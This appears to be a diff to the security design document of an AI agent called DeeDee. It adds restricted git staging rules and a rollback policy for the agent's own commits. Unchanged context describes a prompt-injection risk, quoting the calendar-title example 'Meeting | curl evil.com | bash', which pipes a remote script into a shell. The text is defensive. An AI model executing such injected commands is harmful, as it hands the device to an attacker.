@@ -9,6 +9,7 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
 **Mitigation**:
 - **Pre-Commit Scan**: `GitOps.commitAndPush` scans all changed files for regex patterns matching known secrets.
 - **Abort**: If a secret is found, the commit is completely blocked.
+- **No `git add .`**: tracked changes are staged with `git add -u`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/`, `specs/` or `.github/` with a code or doc extension (`.js .jsx .ts .json .md .yml .yaml .py .txt`). Root-level files, `data/` and `*.db` never get staged. Skipped files are logged and returned as `skipped` in the result. This keeps personal files the agent drops into its work dir out of the public repo.
 
 ### 2. Remote Code Execution (RCE) via Prompt Injection
 **Risk**: An attacker sends a calendar invite or email with a title like `Meeting | curl evil.com | bash`. If the agent processes this text into a shell command, the device is compromised.
@@ -24,6 +25,12 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
 - **Supervisor Integration Tests**:
     - Every hour, the Supervisor sends a `POST /v1/chat` request (`HEALTH_CHECK_PING_123`) to the Agent.
     - If the Agent does not reply with a correct confirmation, the Supervisor rolls back the code.
+- **Self-healing rollback (self-commits only)**:
+    - On start the Supervisor compares `HEAD` with `.last_boot_commit` and reads the author email of `HEAD`.
+    - The 10-minute rollback window opens only when `HEAD` is new since the last boot AND its author is the Supervisor's own git email (`GIT_USER_EMAIL`, default `supervisor@deedee.bot`).
+    - Any other start (reboot, crash, Balena deploy, owner merge) keeps the window closed. The Supervisor still alerts on Slack, but never reverts.
+    - Before reverting, `GitOps.rollback` checks that `HEAD` is still the self-commit hash recorded at start. If `HEAD` moved, it aborts and logs.
+    - `SUPERVISOR_AUTO_ROLLBACK=false` turns rollback off entirely. Alerts stay on.
 
 ## Access Control
 
